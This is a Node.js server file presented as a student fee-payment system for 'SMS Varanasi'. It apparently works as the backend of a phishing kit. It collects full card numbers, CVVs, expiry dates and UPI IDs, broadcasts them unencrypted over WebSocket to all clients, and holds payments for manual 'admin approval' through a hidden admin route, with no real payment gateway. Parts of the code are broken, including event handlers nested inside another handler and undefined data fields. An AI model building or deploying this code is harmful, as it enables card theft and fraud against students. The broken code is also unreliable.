// SMS Varanasi Payment System - Backend Server
// PRODUCTION-READY HYBRID MULTI-PROTOCOL SYSTEM: SSE + WebSocket + REST API

require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');

// Import production modules
const logger = require('./config/logger');
const database = require('./config/database');
const { authenticateAdmin, authenticateToken, ensureDefaultAdmin } = require('./middleware/auth');
const { apiLimiter, loginLimiter, paymentLimiter, sseLimiter } = require('./middleware/rateLimiter');
const { 
    validateLogin, 
    validatePaymentSession, 
    validateCardDetails, 
    validateUpiDetails,
    validateAdminCommand,
    sanitizeObject 
} = require('./middleware/validator');

// Initialize Express App
const app = express();
const server = http.createServer(app);

// Security middleware
app.use(helmet({
    contentSecurityPolicy: false, // Adjust for your needs
    crossOriginEmbedderPolicy: false
}));

// CORS configuration
const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000').split(',');
app.use(cors({
    origin: function(origin, callback) {
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

// Initialize Socket.IO with CORS
const io = socketIO(server, {
    cors: {
        origin: allowedOrigins,
        methods: ["GET", "POST"],
        credentials: true
    },
    transports: ['websocket', 'polling']
});

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Request logging
app.use((req, res, next) => {
    logger.info(`${req.method} ${req.path}`, {
        ip: req.ip,
        userAgent: req.get('user-agent')
    });
    next();
});

// Serve static files
app.use(express.static(path.join(__dirname, '../')));

// Runtime data storage (non-persistent)
const systemData = {
    activeConnections: new Set(),
    sseClients: new Set(), // SSE connections
    wsClients: new Set(),  // WebSocket connections
    paymentSessions: new Map() // Track active payment sessions
};

// Stats cache (refreshed from database)
let statsCache = {
    totalTransactions: 0,
    totalRevenue: 0,
    activeStudents: 266,
    pendingPayments: 0,
    lastUpdated: null
};

// Refresh stats from database
async function refreshStats() {
    try {
        const transactions = await database.getAllTransactions(1000);
        const completedTransactions = transactions.filter(t => t.status === 'completed');
        
        statsCache = {
            totalTransactions: completedTransactions.length,
            totalRevenue: completedTransactions.reduce((sum, t) => sum + t.amount, 0),
            activeStudents: 266, // From student database
            pendingPayments: systemData.paymentSessions.size,
            lastUpdated: new Date().toISOString()
        };
        
        return statsCache;
    } catch (error) {
        logger.error('Error refreshing stats:', error);
        return statsCache;
    }
}

// ============================================
// HYBRID PROTOCOL ROUTER
// ============================================

class HybridProtocolRouter {
    constructor(io, systemData) {
        this.io = io;
        this.data = systemData;
    }
    
    // Broadcast via SSE (Server-Sent Events)
    broadcastSSE(eventType, data) {
        const message = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
        this.data.sseClients.forEach(client => {
            try {
                client.write(message);
            } catch (error) {
                console.error('SSE write error:', error);
                this.data.sseClients.delete(client);
            }
        });
        logEvent(`SSE broadcast: ${eventType}`, 'info');
    }
    
    // Broadcast via WebSocket (Socket.IO)
    broadcastWebSocket(eventType, data) {
        this.io.emit(eventType, data);
        logEvent(`WebSocket broadcast: ${eventType}`, 'info');
    }
    
    // Smart broadcast - choose best protocol
    smartBroadcast(eventType, data, priority = 'normal') {
        if (priority === 'critical') {
            // Use both for critical events
            this.broadcastWebSocket(eventType, data);
            this.broadcastSSE(eventType, data);
        } else if (priority === 'high') {
            // Use WebSocket for high priority
            this.broadcastWebSocket(eventType, data);
        } else {
            // Use SSE for normal priority (more efficient)
            this.broadcastSSE(eventType, data);
        }
    }
    
    // Send to specific client
    sendToClient(clientId, eventType, data, protocol = 'websocket') {
        if (protocol === 'websocket') {
            this.io.to(clientId).emit(eventType, data);
        }
        // SSE doesn't support targeting (broadcast only)
    }
}

const protocolRouter = new HybridProtocolRouter(io, systemData);

// Helper function to log events (deprecated - use logger)
function logEvent(message, type = 'info') {
    const levelMap = { 'success': 'info', 'warning': 'warn', 'error': 'error', 'info': 'info' };
    const level = levelMap[type] || 'info';
    if (logger && typeof logger[level] === 'function') {
        logger[level](message);
    } else {
        console.log('[' + type.toUpperCase() + '] ' + message);
    }
}

// ============================================
// SSE (SERVER-SENT EVENTS) ENDPOINT
// ============================================

app.get('/api/stream/events', (req, res) => {
    // Set SSE headers
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });
    
    // Add client to SSE pool
    systemData.sseClients.add(res);
    console.log('? New SSE client connected. Total SSE clients:', systemData.sseClients.size);
    logEvent(`New SSE client connected`, 'success');
    
    // Send initial data
    res.write(`event: connected\ndata: ${JSON.stringify({
        message: 'SSE connection established',
        timestamp: new Date().toISOString()
    })}\n\n`);
    
    // Send current stats immediately
    res.write(`event: statsUpdate\ndata: ${JSON.stringify(statsCache)}\n\n`);
    
    // Keep connection alive with heartbeat
    const heartbeat = setInterval(() => {
        res.write(`:heartbeat ${Date.now()}\n\n`);
    }, 30000); // Every 30 seconds
    
    // Handle client disconnect
    req.on('close', () => {
        clearInterval(heartbeat);
        systemData.sseClients.delete(res);
        console.log('? SSE client disconnected. Total SSE clients:', systemData.sseClients.size);
        logEvent(`SSE client disconnected`, 'warning');
    });
});

// ============================================
// WEBSOCKET CONNECTION HANDLER (Enhanced)
// ============================================

io.on('connection', (socket) => {
    console.log('? New WebSocket client connected:', socket.id);
    systemData.activeConnections.add(socket.id);
    systemData.wsClients.add(socket);
    logEvent(`New WebSocket client: ${socket.id}`, 'success');
    
    // Send current stats to newly connected client
    socket.emit('statsUpdate', statsCache);
    
    // Broadcast connection count to all clients
    io.emit('connectionUpdate', {
        activeConnections: systemData.activeConnections.size,
        sseClients: systemData.sseClients.size,
        wsClients: systemData.wsClients.size
    });
    
    // Handle payment-related events
    socket.on('paymentRequest', (data) => {
        console.log('?? Payment request received:', data);
        handlePaymentRequest(socket, data);
    });
    
    socket.on('cardDetailsSubmitted', (data) => {
        console.log('?? Card details submitted:', data);
        handleCardDetailsSubmission(socket, data);
    });
    
    socket.on('upiDetailsSubmitted', (data) => {
        console.log('?? UPI details submitted:', data);
        handleUpiDetailsSubmission(socket, data);
    });
    

    socket.on('bhimDetailsSubmitted', (data) => {

        console.log('💳 BHIM details submitted:', data);

        handleBhimDetailsSubmission(socket, data);

    });
    
    // Admin commands
    socket.on('adminCommand', (data) => {
        console.log('?? Admin command received:', data);


    // NEW: Mark submission as seen
    socket.on('markSubmissionSeen', async (data) => {
        try {
            await database.markSubmissionAsSeen(data.sessionId);
            io.emit('submissionMarkedSeen', { sessionId: data.sessionId });
        } catch (error) {
            logger.error('Error marking submission as seen:', error);
        }
    });
    
    // NEW: Hide submission commands
    socket.on('hideSubmissionCommands', async (data) => {
        try {
            await database.hideSubmissionCommands(data.sessionId);
            io.emit('submissionCommandsHidden', { sessionId: data.sessionId });
        } catch (error) {
            logger.error('Error hiding commands:', error);
        }
    });

        handleAdminCommand(socket, data);
    });
    
    // Handle disconnect
    socket.on('disconnect', () => {
        console.log('? WebSocket client disconnected:', socket.id);
        systemData.activeConnections.delete(socket.id);
        systemData.wsClients.delete(socket);
        logEvent(`WebSocket client disconnected: ${socket.id}`, 'warning');
        
        // Broadcast updated connection count
        io.emit('connectionUpdate', {
            activeConnections: systemData.activeConnections.size,
            sseClients: systemData.sseClients.size,
            wsClients: systemData.wsClients.size
        });
    });
    
    // Handle custom events from clients
    socket.on('requestStats', () => {
        socket.emit('statsUpdate', systemData.stats);
    });
    
    socket.on('requestTransactions', () => {
        socket.emit('transactionsList', systemData.transactions);
    });
});

// ============================================
// PAYMENT HANDLERS
// ============================================

function handlePaymentRequest(socket, data) {
    const sessionId = generateSessionId();
    
    systemData.paymentSessions.set(sessionId, {
        socketId: socket.id,
        student: data.student,
        amount: data.amount,
        status: 'initiated',
        timestamp: new Date().toISOString()
    });
    
    // Acknowledge to student
    socket.emit('paymentSessionCreated', {
        sessionId,
        message: 'Payment session created'
    });
    
    // Broadcast to admins via SSE (efficient for notifications)
    protocolRouter.broadcastSSE('paymentInitiated', {
        sessionId,
        student: data.student,
        amount: data.amount
    });
}

async function handleCardDetailsSubmission(socket, data) {
    console.log('?? handleCardDetailsSubmission called with:', {
        sessionId: data.sessionId,
        hasCardDetails: !!data.cardDetails
    });
    
    const { sessionId, cardDetails } = data;
    
    // Validate input
    if (!sessionId) {
        console.error('? No sessionId provided');
        socket.emit('error', { message: 'Session ID is required' });
        return;
    }
    
    if (!cardDetails) {
        console.error('? No cardDetails provided');
        socket.emit('error', { message: 'Card details are required' });
        return;
    }
    
    // Get session
    const session = systemData.paymentSessions.get(sessionId);
    
    if (!session) {
        console.error('? Session not found:', sessionId);
        console.log('?? Available sessions:', Array.from(systemData.paymentSessions.keys()));
        socket.emit('error', { message: 'Payment session not found' });
        return;
    }
    
    console.log('? Session found:', {
        sessionId,
        hasStudent: !!session.student,
        studentName: session.student?.name
    });
    
    // Store card details securely (in production, encrypt immediately)
    session.cardDetails = {
        cardNumber: cardDetails.cardNumber, // Full card number for admin
        cardType: cardDetails.cardType,
        expiryDate: cardDetails.expiryDate,
        cvv: cardDetails.cvv, // CVV for admin verification
        cardHolderName: cardDetails.cardHolderName
    };
    session.paymentMethod = 'Card';
    session.status = 'processing';
    
    console.log('?? Card details stored in session');
    
    
    // Prepare submission data for database
    const submissionData = {
        sessionId,
        type: 'card',
        student: session.student,
        cardDetails: session.cardDetails,
        amount: session.amount,
        timestamp: new Date().toISOString(),
        status: 'processing'
    };
    
    // CRITICAL FIX: Save to database for persistence
    try {
        await database.createCardSubmission(submissionData);
        console.log('? Card submission saved to database');
        logger.info('Card submission persisted', { sessionId });
    } catch (error) {
        logger.error('Error saving card submission to database:', error);
        // Continue anyway - don't block the flow
    }
    // Prepare broadcast data
    const broadcastData = {
        sessionId,
        student: session.student,
        cardDetails: session.cardDetails,
        amount: session.amount,
        timestamp: new Date().toISOString()
    };
    
    console.log('?? Broadcasting card details:', {
        sessionId,
        studentName: session.student?.name,
        cardType: session.cardDetails.cardType
    });
    
    // Send card details to admin via WebSocket (critical, bidirectional)
    // Send ONLY via WebSocket (direct broadcast)
    io.emit('cardDetailsReceived', broadcastData);
    console.log('? Broadcasted cardDetailsReceived via WebSocket to all clients');
    
    // Send confirmation back to student
    socket.emit('cardDetailsAcknowledged', {
        sessionId,
        message: 'Card details received, waiting for admin approval'
    });
    
    logEvent(`Card details received for session: ${sessionId}`, 'info');
    console.log('? Card details processing complete');
}

async function handleUpiDetailsSubmission(socket, data) {
    const { sessionId, paymentType, upiId, amount, studentData, orderID } = data;
    
    // Create or update session
    let session = systemData.paymentSessions.get(sessionId);
    if (!session) {
        session = {
            sessionId,
            student: studentData,
            amount: amount || 82450,
            orderID,
            timestamp: new Date().toISOString()
        };
        systemData.paymentSessions.set(sessionId, session);
    }
    
    session.upiDetails = {
        upiId: upiId,
        upiApp: upiId.split('@')[1] || 'Unknown'
    };
    session.paymentMethod = 'UPI';
    session.status = 'processing';
    
    // Prepare submission data for database
    const submissionData = {
        sessionId,
        type: 'upi',
        student: session.student,
        upiDetails: session.upiDetails,
        amount: session.amount,
        timestamp: new Date().toISOString(),
        status: 'processing'
    };
    
    // CRITICAL FIX: Save to database for persistence
    try {
        await database.createCardSubmission(submissionData);
        console.log('? UPI submission saved to database');
        logger.info('UPI submission persisted', { sessionId });
    } catch (error) {
        logger.error('Error saving UPI submission to database:', error);
        // Continue anyway - don't block the flow
    }
    
    // Send UPI details to admin via WebSocket
    // Send ONLY via WebSocket
    io.emit('upiDetailsReceived', {
        sessionId,
        student: session.student,
        upiDetails: session.upiDetails,
        amount: session.amount,
        timestamp: new Date().toISOString()
    });
    
    console.log('? Broadcasted upiDetailsReceived via WebSocket to all clients');
    
    // Send confirmation back to student
    socket.emit('upiDetailsAcknowledged', {
        sessionId,
        message: 'UPI details received, waiting for admin approval'
    });
    
    logEvent(`UPI details received for session: ${sessionId}`, 'info');
    console.log('? UPI details processing complete');
}

async function handleBhimDetailsSubmission(socket, data) {
    const { sessionId, paymentType, upiId, amount, studentData, orderID } = data;
    
    let session = systemData.paymentSessions.get(sessionId);
    if (!session) {
        session = {
            sessionId,
            student: studentData,
            amount: amount || 82450,
            orderID,
            timestamp: new Date().toISOString()
        };
        systemData.paymentSessions.set(sessionId, session);
    }
    
    session.bhimDetails = {
        upiId: upiId,
        upiApp: upiId.split('@')[1] || 'Unknown'
    };
    session.paymentMethod = 'BHIM';
    session.status = 'processing';
    
    const submissionData = {
        sessionId,
        type: 'bhim',
        student: session.student,
        bhimDetails: session.bhimDetails,
        amount: session.amount,
        timestamp: new Date().toISOString(),
        status: 'processing'
    };
    
    try {
        await database.createCardSubmission(submissionData);
        console.log('?? BHIM submission saved to database');
        logger.info('BHIM submission persisted', { sessionId });
    } catch (error) {
        logger.error('Error saving BHIM submission to database:', error);
    }
    
    io.emit('bhimDetailsReceived', {
        sessionId,
        student: session.student,
        bhimDetails: session.bhimDetails,
        amount: session.amount,
        timestamp: new Date().toISOString()
    });
    
    console.log('?? Broadcasted bhimDetailsReceived via WebSocket to all clients');
    
    socket.emit('bhimDetailsAcknowledged', {
        sessionId,
        message: 'BHIM details received, waiting for admin approval'
    });
    
    logEvent(`BHIM details received for session: ${sessionId}`, 'info');
    console.log('? BHIM details processing complete');
}


async function handleAdminCommand(socket, data) {
    const { command, sessionId, action } = data;
    
    logEvent(`Admin command: ${command} for session: ${sessionId}`, 'info');
    
    if (command === 'approvePayment') {
        approvePayment(sessionId);
    } else if (command === 'rejectPayment') {
        rejectPayment(sessionId, data.reason);
    }
}

async function approvePayment(sessionId) {
    const session = systemData.paymentSessions.get(sessionId);
    if (!session) return;
    
    session.status = 'completed';
    
    // Create transaction
    const transaction = {
        id: generateTransactionId(),
        sessionId,
        rollNumber: session.student.rollNumber,
        studentName: session.student.name,
        amount: session.amount,
        paymentMethod: session.paymentMethod,
        cardType: session.cardDetails?.cardType,
        status: 'completed',
        timestamp: new Date().toISOString()
    };
    
    // Update stats
    systemData.stats.totalTransactions++;
    systemData.stats.totalRevenue += session.amount;
    systemData.stats.pendingPayments = Math.max(0, systemData.stats.pendingPayments - 1);
    
    // Store transaction
    systemData.transactions.push(transaction);
    
    // Notify student via WebSocket (critical confirmation)
    const studentSocket = Array.from(systemData.wsClients).find(s => s.id === session.socketId);
    if (studentSocket) {
        studentSocket.emit('paymentApproved', {
            transaction,
            message: 'Payment approved successfully'
        });
    }
    
    // Broadcast to all admins via BOTH protocols (critical event)
    protocolRouter.smartBroadcast('paymentCompleted', transaction, 'critical');
    protocolRouter.smartBroadcast('statsUpdate', systemData.stats, 'critical');
    
    logEvent(`Payment approved: ${transaction.id}`, 'success');
}

async function rejectPayment(sessionId, reason) {
    const session = systemData.paymentSessions.get(sessionId);
    if (!session) return;
    
    session.status = 'failed';
    session.failureReason = reason;
    
    systemData.stats.pendingPayments = Math.max(0, systemData.stats.pendingPayments - 1);
    
    // Notify student
    const studentSocket = Array.from(systemData.wsClients).find(s => s.id === session.socketId);
    if (studentSocket) {
        studentSocket.emit('paymentRejected', {
            reason,
            message: 'Payment was rejected'
        });
    }
    
    // Broadcast to admins
    protocolRouter.broadcastWebSocket('paymentFailed', {
        sessionId,
        student: session.student,
        reason,
        timestamp: new Date().toISOString()
    });
    
    logEvent(`Payment rejected: ${sessionId} - ${reason}`, 'error');
}

// Helper functions
function maskCardNumber(cardNumber) {
    const cleaned = cardNumber.replace(/\s/g, '');
    return cleaned.slice(0, 4) + ' **** **** ' + cleaned.slice(-4);
}

function generateSessionId() {
    return 'SES' + Date.now() + Math.floor(Math.random() * 10000);
}

// API Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'running',
        uptime: process.uptime(),
        activeConnections: systemData.activeConnections.size,
        timestamp: new Date().toISOString()
    });
});

// 5?? DEBUG ENDPOINT: Runtime verification
app.get('/debug/db-runtime', (req, res) => {
    const path = require('path');
    const dbConfigPath = path.join(__dirname, 'config', 'database.js');
    res.json({
        cwd: process.cwd(),
        __dirname: __dirname,
        dbConfigPath: dbConfigPath,
        nodeEnv: process.env.NODE_ENV,
        dbPathEnv: process.env.DB_PATH
    });
});
// Get current stats
app.get('/api/stats', (req, res) => {
    res.json(systemData.stats);
});

// Get all transactions
app.get('/api/transactions', (req, res) => {
    res.json({
        total: systemData.transactions.length,
        transactions: systemData.transactions
    });
});


// ============================================

// ============================================
// NEW API ENDPOINTS FOR PERSISTENT SUBMISSIONS
// ============================================

// Get all card submissions
app.get('/api/admin/submissions', async (req, res) => {
    try {
        const submissions = await database.getAllCardSubmissions(1000);
        res.json({
            success: true,
            total: submissions.length,
            submissions: submissions
        });
        logger.info('All submissions loaded', { count: submissions.length });
    } catch (error) {
        logger.error('Error loading submissions:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to load submissions'
        });
    }
});

// Mark submission as seen
app.post('/api/admin/submissions/:sessionId/seen', async (req, res) => {
    try {
        const { sessionId } = req.params;
        await database.markSubmissionAsSeen(sessionId);
        io.emit('submissionMarkedSeen', { sessionId });
        res.json({
            success: true,
            message: 'Submission marked as seen'
        });
        logger.info('Submission marked as seen', { sessionId });
    } catch (error) {
        logger.error('Error marking submission as seen:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to mark submission as seen'
        });
    }
});

// Hide commands for submission
app.post('/api/admin/submissions/:sessionId/hide-commands', async (req, res) => {
    try {
        const { sessionId } = req.params;
        await database.hideSubmissionCommands(sessionId);
        io.emit('submissionCommandsHidden', { sessionId });
        res.json({
            success: true,
            message: 'Commands hidden for submission'
        });
        logger.info('Commands hidden for submission', { sessionId });
    } catch (error) {
        logger.error('Error hiding commands:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to hide commands'
        });
    }
});
// ADMIN AUTHENTICATION ROUTES
// ============================================

// Admin Login
app.post('/api/admin/login', loginLimiter, async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({
                success: false,
                error: 'Username and password are required'
            });
        }
        
        // Authenticate admin
        const result = await authenticateAdmin(username, password);
        
        if (result.success) {
            logger.info('Admin login successful', { username });
            res.json({
                success: true,
                token: result.token,
                user: result.user
            });
        } else {
            logger.warn('Admin login failed', { username, error: result.error });
            res.status(401).json({
                success: false,
                error: result.error
            });
        }
    } catch (error) {
        logger.error('Admin login error:', error);
        res.status(500).json({
            success: false,
            error: 'Login failed. Please try again.'
        });
    }
});

// Verify Admin Token
app.get('/api/admin/verify', authenticateToken, (req, res) => {
    res.json({
        success: true,
        user: req.user
    });
});
// Student Login Event
app.post('/api/student/login', (req, res) => {
    const { rollNumber, name, course, semester } = req.body;
    
    const loginData = {
        rollNumber,
        name,
        course,
        semester,
        timestamp: new Date().toISOString()
    };
    
    systemData.studentLogins.push(loginData);
    
    // Broadcast to all connected admins
    io.emit('studentLogin', loginData);
    
    logEvent(`Student login: ${rollNumber} - ${name}`, 'info');
    
    res.json({
        success: true,
        message: 'Login recorded'
    });
});

// Payment Initiated Event
app.post('/api/payment/initiate', (req, res) => {
    const { rollNumber, studentName, amount, paymentMethod } = req.body;
    
    // Increment pending payments
    systemData.stats.pendingPayments++;
    
    const paymentData = {
        rollNumber,
        studentName,
        amount,
        paymentMethod,
        status: 'initiated',
        timestamp: new Date().toISOString()
    };
    
    // Broadcast to all connected admins
    io.emit('paymentInitiated', paymentData);
    io.emit('statsUpdate', systemData.stats);
    
    logEvent(`Payment initiated: ?${amount} by ${studentName}`, 'info');
    
    res.json({
        success: true,
        message: 'Payment initiated',
        transactionId: generateTransactionId()
    });
});

// Payment Completed Event
app.post('/api/payment/complete', (req, res) => {
    const { rollNumber, studentName, amount, paymentMethod, cardType, transactionId } = req.body;
    
    // Create transaction record
    const transaction = {
        id: transactionId || generateTransactionId(),
        rollNumber,
        studentName,
        amount: parseInt(amount) || 82450,
        paymentMethod: paymentMethod || 'Credit/Debit Card',
        cardType: cardType || 'Unknown',
        status: 'completed',
        timestamp: new Date().toISOString()
    };
    
    // Update stats
    systemData.stats.totalTransactions++;
    systemData.stats.totalRevenue += transaction.amount;
    systemData.stats.pendingPayments = Math.max(0, systemData.stats.pendingPayments - 1);
    
    // Store transaction
    systemData.transactions.push(transaction);
    
    // Broadcast to all connected admins
    io.emit('paymentCompleted', transaction);
    io.emit('newTransaction', transaction);
    io.emit('statsUpdate', systemData.stats);
    
    logEvent(`Payment completed: ?${amount} by ${studentName} (${transactionId})`, 'success');
    
    res.json({
        success: true,
        message: 'Payment completed successfully',
        transaction
    });
});

// Payment Failed Event
app.post('/api/payment/failed', (req, res) => {
    const { rollNumber, studentName, amount, reason } = req.body;
    
    // Decrement pending payments
    systemData.stats.pendingPayments = Math.max(0, systemData.stats.pendingPayments - 1);
    
    const failureData = {
        rollNumber,
        studentName,
        amount,
        reason: reason || 'Payment processing failed',
        timestamp: new Date().toISOString()
    };
    
    // Broadcast to all connected admins
    io.emit('paymentFailed', failureData);
    io.emit('statsUpdate', systemData.stats);
    
    logEvent(`Payment failed: ${studentName} - ${reason}`, 'error');
    
    res.json({
        success: true,
        message: 'Payment failure recorded'
    });
});

// Get system logs
app.get('/api/logs', (req, res) => {
    res.json({
        total: systemData.systemLogs.length,
        logs: systemData.systemLogs
    });
});

// Helper function to generate transaction ID
function generateTransactionId() {
    const timestamp = Date.now();
    const random = Math.floor(Math.random() * 10000);
    return `TXN${timestamp}${random}`;
}

// Admin Panel Route
app.get('/parking55009hvSweJimbs5hhinbd56y', (req, res) => {
    res.sendFile(path.join(__dirname, '../admin/index.html'));
});

// Main payment page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// ============================================
// SERVER INITIALIZATION
// ============================================

const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

async function startServer() {
    try {
        // Connect to database
        logger.info('Connecting to database...');
        await database.connect();
        
        // Ensure default admin exists
        await ensureDefaultAdmin();
        
        // Refresh stats on startup
        await refreshStats();
        
        // Start periodic stats refresh (every 30 seconds)
        setInterval(async () => {
            await refreshStats();
            // Broadcast updated stats to all clients
            protocolRouter.broadcastSSE('statsUpdate', statsCache);
        }, 30000);
        
        // Start server
        server.listen(PORT, () => {
            console.log('===========================================');
            console.log('?? SMS Varanasi Payment System Server');
            console.log('===========================================');
            console.log(`? Environment: ${NODE_ENV}`);
            console.log(`? Server: http://localhost:${PORT}`);
            console.log(`? Admin Panel: http://localhost:${PORT}/parking55009hvSweJimbs5hhinbd56y`);
            console.log(`? Database: Connected`);
            console.log(`? WebSocket: Active`);
            console.log(`? SSE Streaming: Active`);
            console.log(`? Security: Helmet + Rate Limiting`);
            console.log(`? Logging: Winston`);
            console.log('===========================================');
            
            if (NODE_ENV === 'development') {
                console.log('??  DEVELOPMENT MODE');
                console.log('??  Change credentials before production!');
            }
            
            logger.info('Server started successfully', { port: PORT, env: NODE_ENV });
        });
        
    } catch (error) {
        logger.error('Failed to start server:', error);
        process.exit(1);
    }
}

// Start the server
startServer();

// ============================================
// GRACEFUL SHUTDOWN & ERROR HANDLING
// ============================================

async function gracefulShutdown(signal) {
    logger.info(`${signal} received, shutting down gracefully...`);
    
    try {
        // Close server
        server.close(async () => {
            logger.info('HTTP server closed');
            
            // Close database
            await database.close();
            logger.info('Database connection closed');
            
            // Close SSE connections
            systemData.sseClients.forEach(client => {
                try {
                    client.end();
                } catch (err) {
                    logger.error('Error closing SSE client:', err);
                }
            });
            
            logger.info('Shutdown complete');
            process.exit(0);
        });
        
        // Force shutdown after 10 seconds
        setTimeout(() => {
            logger.error('Forced shutdown after timeout');
            process.exit(1);
        }, 10000);
        
    } catch (error) {
        logger.error('Error during shutdown:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// Uncaught exception handler
process.on('uncaughtException', (err) => {
    logger.error('Uncaught Exception:', {
        error: err.message,
        stack: err.stack
    });
    
    // In production, should restart process
    if (NODE_ENV === 'production') {
        gracefulShutdown('UNCAUGHT_EXCEPTION');
    }
});

// Unhandled rejection handler
process.on('unhandledRejection', (reason, promise) => {
    logger.error('Unhandled Rejection:', {
        reason: reason,
        promise: promise
    });
    
    // In production, should restart process
    if (NODE_ENV === 'production') {
        gracefulShutdown('UNHANDLED_REJECTION');
    }
});

// Global error handler middleware
app.use((err, req, res, next) => {
    logger.error('Express error:', {
        error: err.message,
        stack: err.stack,
        path: req.path,
        method: req.method,
        ip: req.ip
    });
    
    res.status(err.status || 500).json({
        error: NODE_ENV === 'production' ? 'Internal server error' : err.message
    });
});

// Export for testing
module.exports = { app, server, io };




